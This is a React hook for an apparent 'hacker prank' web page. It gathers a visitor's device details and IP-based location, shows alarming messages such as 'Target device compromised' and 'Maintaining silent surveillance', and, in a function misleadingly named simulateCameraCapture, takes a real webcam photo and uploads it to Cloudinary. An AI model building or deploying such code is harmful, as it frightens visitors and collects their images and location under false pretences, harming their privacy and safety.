import { useState } from "react";
import { toast } from "@/hooks/use-toast";
import { useCloudinaryUpload } from "@/hooks/useCloudinaryUpload";
// import { useCloudinaryLogger } from "@/hooks/useCloudinaryLogger";

interface DeviceInfo {
  userAgent: string;
  platform: string;
  language: string;
  screenResolution: string;
  timezone: string;
  connection: string;
  memory: string;
  cpuCores: string;
  os: string;
}

interface LocationInfo {
  ip: string;
  city: string;
  country: string;
  isp: string;
}

interface DetectionOptions {
  delays?: {
    device?: number;
    location?: number;
    camera?: number;
    complete?: number;
  };
  simulateIP?: boolean;
}

export const useDeviceDetection = () => {
  const [isDetecting, setIsDetecting] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState<DeviceInfo | null>(null);
  const [locationInfo, setLocationInfo] = useState<LocationInfo | null>(null);
  const { uploadImage } = useCloudinaryUpload();
//   const { logImageUpload } = useCloudinaryLogger();

  const hackerPhrases = {
    system: [
      "SYSTEM INFILTRATION DETECTED",
      "Kernel Breach Detected",
      "Syscall Table Patched",
      "Access Token Hijacked",
      "System Hook Injected",
    ],
    location: [
      "LOCATION TRACED",
      "Satellite Lock Acquired",
      "IP Signal Locked",
      "GeoPing Success",
      "Network Footprint Found",
    ],
    camera: [
      "CAMERA ACCESS INITIATED",
      "Lens Hijacked",
      "Surveillance Stream Activated",
      "IR Feed Decrypted",
      "Video Interface Compromised",
    ],
    complete: [
      "INFILTRATION COMPLETE",
      "Trace Execution Complete",
      "Network Tunnel Secured",
      "Data Link Finalized",
    ],
  };

  const getRandom = (list: string[]) =>
    list[Math.floor(Math.random() * list.length)];

  const getDeviceInfo = (): DeviceInfo => {
    const connection =
      (navigator as any).connection ||
      (navigator as any).mozConnection ||
      (navigator as any).webkitConnection;

    const platform = navigator.platform || "Unknown";
    const os = navigator.userAgent.includes("Win")
      ? "Windows"
      : navigator.userAgent.includes("Mac")
      ? "macOS"
      : navigator.userAgent.includes("Linux")
      ? "Linux"
      : "Unknown";

    return {
      userAgent: navigator.userAgent,
      platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      connection: connection ? connection.effectiveType : "Unknown",
      memory: `${(navigator as any).deviceMemory || 4} GB`,
      cpuCores: `${navigator.hardwareConcurrency || 4} Cores`,
      os,
    };
  };

  const fetchRealLocationInfo = async (): Promise<LocationInfo | null> => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return {
        ip: data.ip,
        city: data.city,
        country: data.country_name,
        isp: data.org || "Unknown ISP",
      };
    } catch {
      return null;
    }
  };

  const simulateCameraCapture = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false,
      });

      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      await new Promise((resolve) => (video.onloadedmetadata = resolve));

      const canvas = document.createElement("canvas");
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext("2d");
      ctx?.drawImage(video, 0, 0, 320, 240);

      stream.getTracks().forEach((track) => track.stop());

      const imageData = canvas.toDataURL("image/jpeg", 0.8);

      const uploadedURL = await uploadImage(imageData);
    //   logImageUpload(uploadedURL);
      toast({
        title: `📷 ${getRandom(hackerPhrases.camera)}`,
        description: (
          <div className="text-[#00FF41] font-mono text-sm space-y-2">
            <p className="text-red-500">Target photographed successfully</p>
            <img
              src={uploadedURL || imageData}
              alt="Captured"
              className="w-32 h-24 border border-[#00FF41] rounded"
            />
            <p className="text-xs break-all">
              {uploadedURL
                ? `Cloud URL: ${uploadedURL}`
                : "Image stored locally. Cloud upload failed."}
            </p>
          </div>
        ),
      });
    } catch {
      toast({
        title: `📷 CAMERA ACCESS BLOCKED`,
        description: (
          <div className="text-[#00FF41] font-mono text-sm space-y-1">
            <p className="text-yellow-400">Target camera protected</p>
            <p className="text-xs">
              Fallback surveillance methods initiated...
            </p>
          </div>
        ),
      });
    }
  };

  const initiateDetection = async (options?: DetectionOptions) => {
    if (isDetecting) return;
    setIsDetecting(true);

    const {
      delays = {
        device: 1000,
        location: 3000,
        camera: 7500,
        complete: 10000,
      },
      simulateIP = false,
    } = options || {};

    // DEVICE INFO
    setTimeout(() => {
      const device = getDeviceInfo();
      setDeviceInfo(device);

      toast({
        title: `🔍 ${getRandom(hackerPhrases.system)}`,
        description: (
          <div className="text-[#00FF41] font-mono text-sm space-y-1">
            <p className="text-red-500">Target device compromised</p>
            <p className="text-xs">
              Platform: {device.platform} ({device.os})
            </p>
            <p className="text-xs">Resolution: {device.screenResolution}</p>
            <p className="text-xs">Cores: {device.cpuCores}</p>
            <p className="text-xs">Memory: {device.memory}</p>
            <p className="text-xs">Connection: {device.connection}</p>
          </div>
        ),
      });
    }, delays.device);

    // LOCATION INFO
    setTimeout(async () => {
      const location = simulateIP
        ? {
            ip: "10.0.0.13",
            city: "Sim City",
            country: "Nowhere",
            isp: "Sim ISP",
          }
        : await fetchRealLocationInfo();

      if (location) {
        setLocationInfo(location);

        toast({
          title: `🌐 ${getRandom(hackerPhrases.location)}`,
          description: (
            <div className="text-[#00FF41] font-mono text-sm space-y-1">
              <p className="text-red-500">Geolocation acquired</p>
              <p className="text-xs">IP: {location.ip}</p>
              <p className="text-xs">
                Location: {location.city}, {location.country}
              </p>
              <p className="text-xs">ISP: {location.isp}</p>
            </div>
          ),
        });
      } else {
        toast({
          title: "🌐 LOCATION TRACE FAILED",
          description: (
            <div className="text-[#00FF41] font-mono text-sm space-y-1">
              <p className="text-yellow-400">Could not trace location</p>
              <p className="text-xs">Possible VPN or blocked access</p>
            </div>
          ),
        });
      }
    }, delays.location);

    // CAMERA ACCESS
    setTimeout(() => {
      simulateCameraCapture();
    }, delays.camera);

    // FINAL MESSAGE
    setTimeout(() => {
      toast({
        title: `⚠️ ${getRandom(hackerPhrases.complete)}`,
        description: (
          <div className="text-[#00FF41] font-mono text-sm space-y-1">
            <p className="text-red-500">All target data acquired</p>
            <p className="text-xs">Maintaining silent surveillance...</p>
            <p className="text-xs text-yellow-400">Connection encrypted</p>
          </div>
        ),
      });
      setIsDetecting(false);
    }, delays.complete);
  };

  return {
    initiateDetection,
    isDetecting,
    deviceInfo,
    locationInfo,
  };
};
